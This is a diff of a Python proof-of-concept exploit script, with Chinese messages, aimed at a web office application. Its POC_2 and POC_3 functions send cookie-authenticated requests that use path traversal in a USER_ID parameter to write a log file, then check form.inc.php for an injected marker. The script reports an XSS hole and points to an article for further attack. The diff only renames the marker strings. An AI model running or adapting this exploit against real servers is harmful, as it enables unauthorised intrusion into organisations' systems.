@@ -42,7 +42,7 @@ def POC_1(target_url, Cookie):
         print("\033[31m[x] 请求失败 \033[0m", e)
 
 def POC_2(target_url, Cookie):
-    vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/test"
+    vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/peiqi"
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
@@ -57,19 +57,19 @@ def POC_2(target_url, Cookie):
     try:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
-        print("\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/test \033[0m".format(target_url))
+        print("\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \033[0m".format(target_url))
         if "档案已保存" in response.text and response.status_code == 200:
-            print("\033[32m[o] 目标 {} 成功上传 test.log 文件, \033[0m".format(target_url))
+            print("\033[32m[o] 目标 {} 成功上传 peiqi.log 文件, \033[0m".format(target_url))
             POC_3(target_url, Cookie)
         else:
-            print("\033[31m[x] 目标 {} 上传 test.log 文件失败\033[0m".format(target_url))
+            print("\033[31m[x] 目标 {} 上传 peiqi.log 文件失败\033[0m".format(target_url))
             sys.exit(0)
 
     except Exception as e:
         print("\033[31m[x] 请求失败 \033[0m", e)
 
 def POC_3(target_url, Cookie):
-    vuln_url = target_url + "/general/reportshop/workshop/report/attachment-remark/form.inc.php?test=test"
+    vuln_url = target_url + "/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi"
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
         "Cookie":  Cookie,
@@ -77,11 +77,11 @@ def POC_3(target_url, Cookie):
     try:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
-        print("\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?test=test \033[0m".format(target_url))
-        if "test_Wiki" in response.text and response.status_code == 200:
-            print("\033[32m[o] 目标 {} 存在漏洞，响应中包含 test_Wiki,存在XSS漏洞, 可参考文章写的利用版本进一步攻击 \033[0m".format(target_url))
+        print("\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi \033[0m".format(target_url))
+        if "PeiQi_Wiki" in response.text and response.status_code == 200:
+            print("\033[32m[o] 目标 {} 存在漏洞，响应中包含 PeiQi_Wiki,存在XSS漏洞, 可参考文章写的利用版本进一步攻击 \033[0m".format(target_url))
         else:
-            print("\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 test_Wiki\033[0m".format(target_url))
+            print("\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 PeiQi_Wiki\033[0m".format(target_url))
             sys.exit(0)
     except Exception as e:
         print("\033[31m[x] 请求失败 \033[0m", e)
